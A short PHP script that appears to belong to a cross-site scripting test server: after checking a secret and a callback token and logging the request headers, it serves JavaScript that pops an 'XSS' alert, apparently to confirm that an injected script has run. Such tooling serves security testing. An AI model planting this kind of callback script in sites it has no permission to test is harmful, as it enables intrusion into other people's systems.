<?php

require_once('../config.php');

validate_secret();

$callback_token = fetch_key($_REQUEST, PARAMETER_CALLBACK_TOKEN);

if(!is_string($callback_token) || strlen($callback_token) == 0) {
  halt_for_usage('/xss.php?callback_token=:token');
}

collect_additional_headers();

update_access_log();

header('Content-Type: application/javascript');
?>

(function() {
  alert('XSS');
})();
